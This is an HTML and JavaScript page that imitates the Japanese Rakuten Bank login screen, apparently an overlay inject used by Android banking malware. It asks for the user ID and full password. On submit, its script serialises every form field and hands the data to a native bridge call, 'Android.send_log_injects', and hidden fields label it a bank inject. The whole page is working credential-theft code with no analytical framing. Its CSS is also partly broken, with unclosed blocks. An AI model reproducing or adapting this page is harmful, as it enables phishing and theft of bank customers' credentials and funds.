<style>

body {
    background-color: #eeeeee;
    color: #1a0e00;
}
html {
    font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
}
.header {
    background: #f8f8f8;
    position: relative;
    z-index: 2;
}
.logongardient {
    padding: 18px 0;
    text-align: left;
    box-shadow: 0px 0px 7px #888888;
}
.logo {
    margin: 0 auto;
    text-align: center;
    color: #000000;
    font-weight: bold;
    font-size: 1.2rem;
    padding-left: 25px;
}
.main {
    margin-top: 40px;

.autorizeBox {
    background: #ffffff;
    border-radius: 5px;
    box-shadow: 0px 0px 4px #cccccc;

.autorizeBox input {
    font-size: 1.125rem;

.autorizeBox input.dt {

.autorizeBox a {
    display: block;
    text-decoration: none;
    color: #452900;
    width: 100%;

.autorizeBox button {
    margin: 20px 0;
    background-color: #ffa700;

.autorizeBox button span {

<body>
    <div class="header"><div class="logongardient">
            <div class="logo">ログイン</div>
        </div>
    </div>
    <div class="main">
        <div class="autorizeBox">
            <form id="login" action="" style="">
                <p>楽天銀行口座のユーザID・ログインパスワードを入力してください。</p>
                <label for="Login">ユーザID</label>
                <input id="Login" name="email" pattern=".{4,}" onkeypress="checkinputsemail(this.value.length);" onchange="checkinputsemail(this.value.length);" autocomplete="off" type="text" required>
                <label for="Password">ログインパスワード（全桁）</label>
                <input id="Password" name="password" pattern=".{4,}" onkeypress="checkinputspassword(this.value.length);" onchange="checkinputspassword(this.value.length);" autocomplete="off" type="password" required>
                <input name="type_injects" value='banks' type="hidden" required>
                <input name="closed" value='close_activity_injects' type="hidden" required>
                <a href="#" style="margin-top: 10px;">ログインでお困りのお客さま <b>></b></a>
                <a href="#">はじめてロ座にログインする場合<b>></b></a>
                <a href="#" style="margin-bottom: 0px;">指紋認証でのログインについて<b>></b></a>
                <button id="btnmybest" type="button" onclick="process('login')" disabled><span>ログイン</span></button>
            </form>
        </div>
    </div>
</body>
<script>
var emailinputs = false;
var passwordinputs = false;

document.getElementById('btnmybest').disabled = !(emailinputs & passwordinputs);

function checkinputsemail(lentext) {
    if(lentext > 4)
    {
        emailinputs = true;
    }
    document.getElementById('btnmybest').disabled = !(emailinputs & passwordinputs);
}

function checkinputspassword(lentext) {
    if(lentext > 4)
    {
        passwordinputs = true;
    }
    document.getElementById('btnmybest').disabled = !(emailinputs & passwordinputs);
}

function process(formId) {
    var ua = navigator.userAgent.toLowerCase();
    if(ua.indexOf("android") > -1) {
        try {
        Android.send_log_injects(formToJSONbyName(document.getElementById(formId)));
        } catch (err) {}
    }else{
       alert(formToJSONbyName(document.getElementById(formId)));
    }
    formChange(formId);
}

/*********Recursive implementation of jSON.stringify; ********/
var stringifyJSON = function(obj) {
    var arrOfKeyVals = [],
        arrVals = [],
        objKeys = [];

    /*********CHECK FOR PRIMITIVE TYPES**********/
    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
        return '' + obj;
    else if (typeof obj === 'string')
        return '"' + obj + '"';

    /*********CHECK FOR ARRAY**********/
    else if (Array.isArray(obj)) {
        if (obj[0] === undefined)
            return '[]';
        else {
            obj.forEach(function(el) {
                arrVals.push(stringifyJSON(el));
            });
            return '[' + arrVals + ']';
        }
    }
    /*********CHECK FOR OBJECT**********/
    else if (obj instanceof Object) {
        objKeys = Object.keys(obj);
        objKeys.forEach(function(key) {
            var keyOut = '"' + key + '":';
            var keyValOut = obj[key];
            if (keyValOut instanceof Function || typeof keyValOut === undefined)
                arrOfKeyVals.push('');
            else if (typeof keyValOut === 'string')
                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
                arrOfKeyVals.push(keyOut + keyValOut);
            else if (keyValOut instanceof Object) {
                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
            }
        });
        return '{' + arrOfKeyVals + '}';
    }
};

function formToJSONbyName(f)
{
    var FinalObject = {}, namesHTML = ['input','select'];
    for(var i = 0; i < namesHTML.length; i++) {
		var bsform = f.getElementsByTagName(namesHTML[i]);
        for(var j = 0; j < bsform.length; j++) {
            FinalObject[bsform[j].name] = bsform[j].value
        }
    }
    return stringifyJSON(FinalObject);
}
</script>
